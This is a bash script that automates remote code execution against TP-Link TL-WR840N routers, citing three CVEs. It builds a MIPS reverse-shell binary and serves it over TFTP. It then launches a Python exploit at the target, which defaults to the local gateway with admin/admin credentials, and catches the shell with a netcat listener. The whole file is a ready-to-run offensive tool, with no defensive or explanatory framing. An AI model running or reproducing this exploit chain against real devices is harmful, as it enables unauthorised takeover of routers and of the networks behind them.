#!/usr/bin/env bash
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
clear_color='\033[0m'
printhelp() {
    printf "${green}$(basename $0)${clear_color}: automating exploitation of TL-WR840N routers\n"
    printf "Relevant CVEs: CVE-2021-41653, CVE-2022-25064, CVE-2018-11714\n"
    printf "Usage: ./$(basename $0) -t TARGET -l LISTENER -p PORT -u USERNAME -c PASSWORD\n"
    printf "All parameters are optional; if not provided as arguments then this script will attempt to automatically detect them\n"
    exit 1
}

if [ ! -f "$PWD/.firstrun" ]; then
    printf "${green}Checking${clear_color} tftpd installation\n"
    if [ "$EUID" -ne 0 ]; then
        printf "${red}Error${clear_color}:Run it as root\n"
        exit 1
    fi
    if [ -f "/etc/debian_version" ]; then
        if (dpkg --get-selections | grep -v deinstall | grep atfpd > /dev/null); then
            apt-get remove aftpd
        fi
        if ! (dpkg --get-selections | grep -v deinstall | grep tftpd-hpa > /dev/null); then
            apt-get update
            apt-get install tftpd-hpa
        else
            printf "${green}tftpd-hpa${clear_color} already installed\n"
        fi
    elif [ -f "/etc/arch-release" ]; then
        if ! (pacman -Q | grep tftp-hpa > /dev/null); then
            pacman -Sy --noconfirm tftp-hpa
        else
            printf "${green}tftp-hpa${clear_color} already installed\n"
        fi
    else
        printf "${red}Error${clear_color}: unsupported operating system\n"
        exit 1
    fi
    if ! (diff $PWD/tftpd-hpa /etc/default/tftpd-hpa); then
        if [ -f /etc/default/tftpd-hpa ]; then
            mv /etc/default/tftpd-hpa /etc/default/tftpd-hpa.bak
            printf "${green}Saved${clear_color} original config file at /etc/default/tftpd-hpa.bak\n"
        fi
        cp $PWD/tftpd-hpa /etc/default/tftpd-hpa
        printf "${green}tftpd-hpa${clear_color} configured successfully\n"
    else
        printf "${green}tftpd-hpa${clear_color} already configured\n"
    fi
    if [ "$(uname -m)" == "x86_64" ]; then
        toolchainpath="/opt/toolchains/mipsel-linux-muslsf-cross"
        if [ ! -d "$toolchainpath" ]; then
            printf "${green}Downloading${clear_color} mipsel-linux-muslsf toolchain\n"
            if [ ! -d "/opt/toolchains" ]; then
                mkdir -p /opt/toolchains
            fi
            cd /opt/toolchains
            git clone -b mipsel https://github.com/akabul0us/musl_linux_static_toolchains mipsel-linux-muslsf-cross || printf "${red}Unknown error${clear_color}: could not clone toolchain (is git installed?)\n" && exit 1
        else
            printf "${green}Found${clear_color} mipsel-linux-muslsf toolchain on device\n"
        fi
    elif [ "$(uname -m)" == "aarch64" ]; then
        toolchainpath="/opt/mipsel-linux-muslsf_cross-aarch64"
        if [ ! -d "$toolchainpath" ]; then
            printf "${green}Downloading${clear_color} mipsel-linux-muslsf toolchain\n"
            if [ ! -d "/opt" ]; then
                mkdir -p /opt
            fi
            cd /opt
            curl -fsSL https://github.com/akabul0us/aarch64-static-bins/raw/refs/heads/main/mipsel-linux-muslsf_cross-aarch64.tar.xz | tar xJvf -
        else
            printf "${green}Found${clear_color} mipsel-linux-muslsf toolchain on device\n"
        fi
        touch $PWD/.firstrun
    else
        printf "Unsupported architecture\n"
        exit 1
   fi
fi
while getopts 't:l:p:h' option; do
	case $option in
		t)
			target="$OPTARG"
			;;
		l)
			listener="$OPTARG"
			;;
		p)
			port="$OPTARG"
			;;
		h)
			printhelp
			;;
        u)
            username="$OPTARG"
            ;;
        c)
            password="$OPTARG"
            ;;
		*)
			printf "${red}Error${clear_color}: unknown flag ${red}$option${clear_color}\n"
			printhelp
			;;
	esac
done
if [ "$(uname -m)" == "aarch64" ]; then
    toolchainpath="/opt/mipsel-linux-muslsf_cross-aarch64"
elif [ "$(uname -m)" == "x86_64" ]; then
    toolchainpath="/opt/toolchains/mipsel-linux-muslsf-cross"
else
    echo "unsupported architecture"
    exit 1
fi
if [ -z "$target" ]; then
    autotarget="$(traceroute -m 1 9.9.9.10 | tail -n 1 | grep -oE "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)")"
    printf "${red}Warning${clear_color}: no target specified with -t flag\n"
    printf "Gateway detected: ${yellow}$autotarget${clear_color}. Is this your target? (Y/n) "
    read targetyorn
    case $targetyorn in
        [Nn])
            read -p "Please enter target IP: " target
            ;;
          *)
            target="$autotarget"
            ;;
    esac
fi
if [ -z "$listener" ]; then
    autolistener="$(ip addr show | grep wlan0 | grep -oE "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" | head -n 1)"
    printf "${red}Warning${clear_color}: no listener specified with -l flag\n"
    printf "Local IP address detected for listener IP: ${yellow}$autolistener${clear_color}. Proceed? (Y/n) "
    read listenyorn
    case $listenyorn in 
        [Nn])
            read -p "Please enter listener IP: " listener
            ;;
          *)
            listener="$autolistener"
            ;;
    esac
fi
if [ -z "$port" ]; then
    printf "Using default port ${yellow}4545${clear_color}\n"
    port=4545
fi
if [ -z "$username" ]; then
    printf "Using default username ${yellow}admin${clear_color}\n"
    username=admin
fi
if [ -z "$password" ]; then
    printf "Using default password ${yellow}admin${clear_color}\n"
    password=admin
fi
printf "${green}Modifying${clear_color} reverse shell source code\n"
cp $PWD/revshell_default.c $PWD/revshell.c
if [ "$port" -ne 4545 ]; then
    if [ "$port" -gt 65535 ] || [ "$port" -lt 1 ]; then
        printf "${red}Error${clear_color}: Invalid listener port $port\n"
        printhelp
    else
        sed -i "s/4545/$port/g" $PWD/revshell.c
    fi
fi
if [ "$listener" != "192.168.1.110" ]; then
    if ! (echo $listener | grep -oE "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" > /dev/null); then
        printf "${red}Error${clear_color}: Invalid IP address $listener for listener\n"
        printhelp
    else
        sed -i "s/192.168.1.110/$listener/g" revshell.c
    fi
fi
printf "${green}Preparing${clear_color} tftpd directory\n"
if [ ! -d "/tftpboot" ]; then
    mkdir /tftpboot
fi
printf "${green}Compiling${clear_color} reverse shell\n"
${toolchainpath}/bin/mipsel-linux-muslsf-gcc -static -fPIC revshell.c -o /tftpboot/r
${toolchainpath}/bin/mipsel-linux-muslsf-strip /tftpboot/r
printf "${green}Setting${clear_color} permissions\n"
chown -R nobody:nogroup /tftpboot
chmod -R 777 /tftpboot
printf "${green}Running${clear_color} tftp server\n"
/usr/sbin/in.tftpd -l
printf "${green}Executing${clear_color} RCE against ${yellow}$target${clear_color}\n"
python3 trwr840.py --username ${username} --password ${password} --target ${target} --lhost ${listener} --lport ${port}
printf "${green}Listening${clear_color} for incoming connections on ${yellow}$port${clear_color}\n"
nc -lvrp $port
